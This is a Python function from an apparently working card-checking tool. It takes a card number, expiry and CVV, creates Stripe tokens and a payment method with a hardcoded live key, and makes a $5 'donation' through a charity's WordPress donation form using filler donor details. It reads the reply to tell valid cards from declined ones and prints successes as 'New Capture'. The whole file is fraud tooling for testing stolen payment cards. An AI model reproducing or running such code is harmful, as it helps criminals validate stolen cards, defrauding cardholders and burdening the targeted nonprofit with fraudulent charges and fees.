from all.configs._def_main_ import *


async def meliodasfunc(cc, mes, ano, cvv):
    email = get_email()
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as sess:
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
        }
        data = f'card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_zip]=10010&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F239a461627%3B+stripe-js-v3%2F239a461627%3B+card-element&time_on_page=478130&key=pk_live_ZI9lhzxu1GlWEiZa0jDibU8K&pasted_fields=number%2Ccvc'
        async with sess.post('https://api.stripe.com/v1/tokens', headers=headers, data=data) as resp:
            req1 = await resp.json()
            _idtok1 = req1['id']
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
        }
        data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[address][postal_code]=10010&guid=NA&muid=NA&sid=NA&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2F239a461627%3B+stripe-js-v3%2F239a461627%3B+card-element&time_on_page=479002&key=pk_live_ZI9lhzxu1GlWEiZa0jDibU8K'
        async with sess.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data) as resp:
            req2 = await resp.json()
            _idtok2 = req2['id']
        headers = {
            'authority': 'teamtrace.org',
            'accept': '*/*',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOaWXKWZOIGPnxQxg',
            'origin': 'https://teamtrace.org',
            'referer': 'https://teamtrace.org/donate-custom-amount/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = f'------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="action"\r\n\r\npiotnetforms_ajax_stripe_intents\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n140\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="form_id"\r\n\r\np62549810\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="fields"\r\n\r\n[{{"label":"First Name","name":"First","value":"Mini","type":"text","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}},{{"label":"Last Name","name":"Last","value":"sadsa","type":"text","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}},{{"label":"Company Name","name":"Company","value":"","type":"text","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}},{{"label":"Email Address","name":"email","value":"asdasdsadaasd@gmail.com","type":"email","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}},{{"label":"Phone Number","name":"p64622916","value":"7145577441","type":"tel","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}},{{"label":"Donation Amount (USD)","name":"amount","value":"5","type":"number","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}},{{"label":"Message","name":"message","value":"","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}},{{"label":"Total Donation Amount","name":"total","value":"$5","type":"text","calculation_results":"5","repeater_id":"","repeater_id_one":"","repeater_index":-1,"repeater_label":"","repeater_length":0}}]\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="referrer"\r\n\r\nhttps://teamtrace.org/donate-custom-amount/\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="remote_ip"\r\n\r\n107.179.20.190\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="stripeToken"\r\n\r\n{_idtok1}\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="amount"\r\n\r\n5\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="description"\r\n\r\n\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg\r\nContent-Disposition: form-data; name="payment_method_id"\r\n\r\n{_idtok2}\r\n------WebKitFormBoundaryOaWXKWZOIGPnxQxg--\r\n'
        async with sess.post('https://teamtrace.org/wp-admin/admin-ajax.php', headers=headers, data=data) as resp:
            req3 = await resp.text()
            msg = parseX(req3, '"error":"', '"')
            if msg == "None":
                lol = f"New Capture {req3}"
                print(lol)
                msg = "Error In Response"
            return msg